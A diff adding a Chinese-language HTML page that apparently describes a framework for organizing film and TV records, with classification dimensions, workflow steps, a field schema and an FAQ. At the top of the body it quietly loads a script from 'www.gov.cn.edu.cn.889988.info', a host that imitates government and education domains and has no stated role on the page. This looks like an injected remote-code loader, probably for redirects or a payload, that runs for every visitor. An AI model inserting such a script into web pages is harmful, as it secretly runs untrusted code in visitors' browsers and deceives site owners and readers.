@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>影视系统 · 影视资料整理方法与分类框架说明 · yingshixitong-top.github.io</title>
+<meta name="description" content="影视系统是一个关于影视资料如何被整理、归类与检索的说明性页面。它从分类维度、整理流程、检索方式和字段规范四个层面，讲清楚一套影视资料体系是怎样搭建起来的。">
+<meta name="keywords" content="影视系统,影视资料整理,影视分类方法,影视检索,资料归类,影视标签,影视字段,影视索引">
+<style>
+:root{--bg:#f4f6f9;--ink:#1f2733;--blue:#1b4f8a;--blue2:#2f6fb5;--cyan:#3aa6a0;--line:#dde3ec;--soft:#eef2f7;--gold:#c8952f;}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;background:var(--bg);color:var(--ink);line-height:1.85;font-size:15px}
+.wrap{max-width:1140px;margin:0 auto;padding:0 24px}
+a{color:var(--blue);text-decoration:none}
+/* topbar */
+.topbar{background:var(--ink);color:#c9d3e0}
+.tbin{display:flex;justify-content:space-between;align-items:center;height:42px;font-size:13px;flex-wrap:wrap;gap:10px}
+.tbin a{color:#c9d3e0}
+.tbin a:hover{color:#fff}
+/* nav */
+nav{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:99}
+.navin{display:flex;align-items:center;gap:20px;height:62px;flex-wrap:wrap}
+.logo{font-size:21px;font-weight:800;color:var(--blue);letter-spacing:.5px;display:flex;align-items:center;gap:9px}
+.logo s{text-decoration:none;background:var(--blue);color:#fff;width:30px;height:30px;border-radius:7px;display:grid;place-items:center;font-size:15px}
+nav a{font-size:14px;color:#465363}
+nav a:hover{color:var(--blue);font-weight:600}
+/* hero */
+.hero{background:linear-gradient(135deg,#163f70 0%,#1b4f8a 50%,#2f6fb5 100%);color:#fff;padding:66px 0 60px;position:relative}
+.hero .wrap{display:grid;grid-template-columns:1.25fr .75fr;gap:44px;align-items:center}
+.hero h1{font-size:38px;line-height:1.3;margin-bottom:18px}
+.hero p{font-size:16px;opacity:.93;max-width:540px}
+.hero .btns{margin-top:26px;display:flex;gap:12px;flex-wrap:wrap}
+.b1{display:inline-block;padding:11px 26px;background:#fff;color:var(--blue);border-radius:5px;font-size:14px;font-weight:600}
+.b2{display:inline-block;padding:11px 26px;border:1px solid rgba(255,255,255,.6);color:#fff;border-radius:5px;font-size:14px}
+.hero aside{border:1px solid rgba(255,255,255,.3);border-radius:8px;padding:18px 20px;background:rgba(255,255,255,.07)}
+.hero aside h3{font-size:14px;letter-spacing:3px;margin-bottom:14px;padding-bottom:9px;border-bottom:1px solid rgba(255,255,255,.28)}
+.hero aside ol{list-style:none;counter-reset:h}
+.hero aside li{counter-increment:h;padding:7px 0 7px 30px;position:relative;font-size:13.5px;border-bottom:1px dashed rgba(255,255,255,.2)}
+.hero aside li:before{counter-increment:none;content:counter(h,decimal-leading-zero);position:absolute;left:0;color:var(--gold);font-weight:700;font-size:13px}
+/* section */
+section{padding:54px 0}
+h2{font-size:23px;color:var(--blue);margin-bottom:7px;display:flex;align-items:center;gap:11px}
+h2 span{font-size:12px;color:#8b97a6;letter-spacing:2px;font-weight:400}
+.sub{color:#6b7686;font-size:14px;margin-bottom:26px}
+/* dims */
+.dims{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.dim{background:#fff;border:1px solid var(--line);border-radius:8px;padding:22px 20px;position:relative}
+.dim i{font-style:normal;color:var(--cyan);font-size:12px;letter-spacing:1px;font-weight:700}
+.dim b{display:block;font-size:18px;margin:6px 0 10px;color:var(--blue)}
+.dim p{font-size:13.5px;color:#5f6b7a}
+.dim em{font-style:normal;display:block;margin-top:12px;padding-top:10px;border-top:1px solid var(--soft);font-size:12.5px;color:#8b97a6}
+/* flow */
+.flow{display:grid;grid-template-columns:repeat(4,1fr);gap:0;counter-reset:f}
+.flow .step{background:#fff;border:1px solid var(--line);padding:22px 20px;position:relative;counter-increment:f}
+.flow .step:not(:last-child){border-right:none}
+.flow .step:before{content:counter(f);position:absolute;right:16px;top:14px;font-size:34px;font-weight:800;color:var(--soft);font-family:Georgia,serif;line-height:1}
+.flow h4{font-size:16px;color:var(--blue);margin-bottom:8px}
+.flow p{font-size:13.5px;color:#5f6b7a}
+/* table */
+.tblwrap{overflow-x:auto;border:1px solid var(--line);border-radius:8px;background:#fff}
+table{width:100%;border-collapse:collapse;min-width:760px;font-size:14px}
+caption{caption-side:top;text-align:left;padding:13px 17px;background:var(--soft);color:var(--blue);font-size:14px;letter-spacing:1px;font-weight:700}
+th,td{padding:11px 15px;text-align:left;border-bottom:1px solid var(--line)}
+th{background:#f8fafc;color:var(--blue);white-space:nowrap;font-weight:700}
+tbody tr:nth-child(even){background:#fafcfe}
+.pill{display:inline-block;padding:1px 10px;border-radius:12px;background:var(--soft);color:var(--blue);font-size:12.5px;border:1px solid var(--line)}
+/* specs */
+.specs{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.spec{border:1px solid var(--line);border-left:5px solid var(--cyan);border-radius:6px;padding:17px 20px;background:#fff}
+.spec h4{font-size:16px;color:var(--blue);margin-bottom:7px}
+.spec p{font-size:13.5px;color:#5f6b7a}
+/* stats */
+.stats{background:var(--ink);color:#e8edf4;border-radius:10px;padding:34px 30px;display:grid;grid-template-columns:repeat(4,1fr);gap:20px;text-align:center}
+.stats b{display:block;font-size:30px;color:var(--gold);font-family:Georgia,serif}
+.stats i{font-style:normal;font-size:13px;opacity:.78}
+/* faq */
+.faq{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.q{border:1px solid var(--line);border-radius:6px;padding:15px 17px;background:#fff}
+.q p:first-child{font-weight:700;color:var(--blue);margin-bottom:5px}
+.q p:first-child:before{content:"Q";color:var(--blue);border:1px solid var(--blue);border-radius:50%;width:18px;height:18px;display:inline-grid;place-items:center;font-size:11px;margin-right:8px}
+.q p:last-child{font-size:13.5px;color:#5f6b7a}
+/* about */
+.about{background:#fff;border:1px solid var(--line);border-top:6px solid var(--blue);border-radius:8px;padding:28px 30px}
+.about p{margin-bottom:12px;font-size:14.5px;color:#3f4a58}
+.urlbar{margin-top:18px;padding:13px 17px;background:var(--soft);border-left:4px solid var(--blue);font-size:14px;word-break:break-all}
+/* footer */
+footer{background:var(--ink);color:#c2ccd8;padding:42px 0 22px;margin-top:40px}
+.fg{display:grid;grid-template-columns:repeat(4,1fr);gap:26px;margin-bottom:28px}
+.fg h4{color:#fff;font-size:15px;margin-bottom:12px}
+.fg a{display:block;color:#98a5b5;font-size:13.5px;padding:3px 0}
+.fg a:hover{color:#fff}
+.copy{border-top:1px solid #3a4553;padding-top:18px;font-size:13px;color:#8793a2;text-align:center}
+.copy b{color:var(--gold)}
+@media(max-width:900px){.hero .wrap{grid-template-columns:1fr}.dims,.flow,.specs,.faq,.fg{grid-template-columns:repeat(2,1fr)}.stats{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:600px){.wrap{padding:0 16px}.hero h1{font-size:28px}.dims,.flow,.specs,.faq,.fg,.stats{grid-template-columns:1fr}.flow .step:not(:last-child){border-right:1px solid var(--line);border-bottom:none}.hero aside{margin-top:20px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="topbar"><div class="tbin"><span>影视系统 · 影视资料整理方法与分类框架说明</span><span><a href="#">资料规范</a> &nbsp;·&nbsp; <a href="#">整理流程</a> &nbsp;·&nbsp; <a href="#">访问本站</a></span></div></div>
+<nav><div class="wrap navin"><a class="logo" href="#"><s>系</s>影视系统</a><a href="#dims">分类维度</a><a href="#flow">整理流程</a><a href="#fields">字段规范</a><a href="#specs">检索方式</a><a href="#faq">常见疑问</a><a href="#about">关于本站</a></div></nav>
+<header class="hero"><div class="wrap"><div><h1>影视系统<br>一套关于影视资料怎么整理的说明</h1><p>影视系统不推荐具体作品，只讲清楚一件事：当影视资料越来越多时，该按什么维度分类、用什么字段描述、通过哪些方式检索，才能让整理结果真正可用。</p><div class="btns"><a class="b1" href="#dims">查看分类维度</a><a class="b2" href="#flow">了解整理流程</a></div></div><aside><h3>本页四个部分</h3><ol><li>资料按哪四个维度分类</li><li>一条条目从收集到入库的流程</li><li>每条资料需要填哪些字段</li><li>检索与复核的四种方式</li></ol></aside></div></header>
+<section id="dims"><div class="wrap"><h2>四个分类维度 <span>CLASSIFICATION</span></h2><p class="sub">单靠题材分类撑不起一套资料体系，因此需要四个维度交叉使用。</p><div class="dims"><div class="dim"><i>DIM 01</i><b>形式维度</b><p>先区分电影、剧集、综艺、纪录、短片、动画，形式决定了资料的结构与观看方式。</p><em>优先使用，先定形式再定其他</em></div><div class="dim"><i>DIM 02</i><b>题材维度</b><p>剧情、喜剧、悬疑、爱情、历史、科幻等，用于表达内容与情绪倾向。</p><em>允许叠加，一部作品可标多个题材</em></div><div class="dim"><i>DIM 03</i><b>地区维度</b><p>按制作地区划分，便于观察不同地区的创作习惯与表达差异。</p><em>以主要制作地区为准</em></div><div class="dim"><i>DIM 04</i><b>年代维度</b><p>按出品年份归档，用于纵向比较同一题材在不同时期的变化。</p><em>精确到年份，不合并为年代段</em></div></div></div></section>
+<section id="flow" style="background:#fff"><div class="wrap"><h2>一条条目的整理流程 <span>WORKFLOW</span></h2><p class="sub">从发现到入库共四步，每一步都有明确的产出与确认动作。</p><div class="flow"><div class="step"><h4>收集</h4><p>把待整理的作品名称、形式与基础信息集中记录，形成待处理清单。</p></div><div class="step"><h4>核对</h4><p>比对公开资料，确认年份、地区、主创与集数等基础信息无误。</p></div><div class="step"><h4>标注</h4><p>按四个维度打标签，并填写下方字段规范中的必填项。</p></div><div class="step"><h4>归档</h4><p>归入对应分类，登记入库时间，进入可检索状态。</p></div></div></div></section>
+<section id="fields"><div class="wrap"><h2>字段规范 <span>FIELDS</span></h2><p class="sub">以下是影视系统中一条资料需要记录的核心字段，分必填与选填两类。</p><div class="tblwrap"><table><caption>影视系统 · 资料字段规范表（共 10 项）</caption><thead><tr><th>字段名称</th><th>字段类型</th><th>填写说明</th><th>是否必填</th></tr></thead><tbody><tr><td>作品名称</td><td>文本</td><td>以公映或首播时的正式名称为准</td><td><span class="pill">必填</span></td></tr><tr><td>形式</td><td>单选</td><td>电影 / 剧集 / 综艺 / 纪录 / 短片 / 动画</td><td><span class="pill">必填</span></td></tr><tr><td>出品年份</td><td>年份</td><td>精确到四位年份</td><td><span class="pill">必填</span></td></tr><tr><td>制作地区</td><td>多选</td><td>可填一个或多个地区</td><td><span class="pill">必填</span></td></tr><tr><td>题材标签</td><td>多选</td><td>最多可选三个，按主次排序</td><td><span class="pill">必填</span></td></tr><tr><td>集数或时长</td><td>数值</td><td>剧集填集数，电影与短片填分钟数</td><td><span class="pill">选填</span></td></tr><tr><td>主创信息</td><td>文本</td><td>导演、主演或主要创作者</td><td><span class="pill">选填</span></td></tr><tr><td>一句话简介</td><td>文本</td><td>控制在五十字以内，不写评价</td><td><span class="pill">选填</span></td></tr><tr><td>整理备注</td><td>文本</td><td>记录资料来源与核对过程</td><td><span class="pill">选填</span></td></tr><tr><td>入库时间</td><td>日期</td><td>完成归档的日期，用于统计</td><td><span class="pill">必填</span></td></tr></tbody></table></div></div></section>
+<section id="specs" style="background:#fff"><div class="wrap"><h2>四种检索与复核方式 <span>RETRIEVAL</span></h2><p class="sub">资料整理完之后，需要能被找回来才算有效。</p><div class="specs"><div class="spec"><h4>按维度组合筛选</h4><p>形式、题材、地区、年代四个维度可以任意组合，快速缩小范围，是最常用的查找方式。</p></div><div class="spec"><h4>按名称模糊匹配</h4><p>输入作品名称的部分字词即可定位，适合只记得大概名字的情况。</p></div><div class="spec"><h4>按入库时间倒序</h4><p>按资料进入系统的时间排列，便于查看近期新增了哪些内容。</p></div><div class="spec"><h4>定期抽样复核</h4><p>每隔一段时间随机抽取条目，核对字段是否仍然准确，及时修正过期信息。</p></div></div></div></section>
+<section id="stats"><div class="wrap"><div class="stats"><div><b>4</b><i>个分类维度</i></div><div><b>10</b><i>项资料字段</i></div><div><b>4</b><i>步整理流程</i></div><div><b>4</b><i>种检索方式</i></div></div></div></section>
+<section id="faq"><div class="wrap"><h2>关于影视系统的常见疑问 <span>FAQ</span></h2><p class="sub">以下是对这套整理方法常见问题的说明。</p><div class="faq"><div class="q"><p>影视系统是做什么的？</p><p>它是一套影视资料的整理框架与分类说明，讲方法而不推荐具体作品。</p></div><div class="q"><p>为什么要把形式放在第一个维度？</p><p>形式决定了资料的呈现结构，先确定形式，后续字段的填写方式才能统一。</p></div><div class="q"><p>题材标签为什么最多只能选三个？</p><p>标签过多会让分类失去区分度，限定数量可以强迫抓住最核心的特征。</p></div><div class="q"><p>一句话简介为什么不能写评价？</p><p>整理系统的目标是记录事实，评价会随时间与主观感受变化，不适合作为固定字段。</p></div><div class="q"><p>资料多久复核一次？</p><p>建议每季度抽样复核一次，信息变动频繁的条目可适当加密。</p></div><div class="q"><p>这套方法适合个人使用吗？</p><p>适合。字段数量与流程步数都经过精简，一个人也能完整执行。</p></div></div></div></section>
+<section id="about"><div class="wrap"><div class="about"><h2 style="margin-top:0">关于影视系统</h2><p>影视系统是对影视资料整理过程的一次方法化总结。它把"收集、核对、标注、归档"拆成明确的步骤，再用四个维度与十项字段把结果固定下来。</p><p>这套框架的重点不在于记多少作品，而在于让每一条资料都能被稳定地找回来。只要维度清晰、字段完整，资料量变大之后仍然好用。</p><p>本站只提供方法与规范说明，不涉及具体作品的播放、下载或资源分发。</p><div class="urlbar">本站访问地址：https://yingshixitong-top.github.io　｜　影视系统 · 影视资料整理方法与分类框架说明</div></div></div></section>
+<footer><div class="wrap"><div class="fg"><div><h4>影视系统</h4><a href="#">整理方法说明</a><a href="#">分类框架</a><a href="#">字段规范</a></div><div><h4>分类维度</h4><a href="#dims">形式维度</a><a href="#dims">题材维度</a><a href="#dims">地区维度</a><a href="#dims">年代维度</a></div><div><h4>使用流程</h4><a href="#flow">收集</a><a href="#flow">核对</a><a href="#flow">标注</a><a href="#flow">归档</a></div><div><h4>访问与说明</h4><a href="#faq">常见疑问</a><a href="#about">关于本站</a><a href="#">资料复核</a></div></div><p class="copy">© 影视系统 · 影视资料整理方法与分类框架说明　｜　站点地址：<b>https://yingshixitong-top.github.io</b></p></div></footer>
+</body>
+</html>
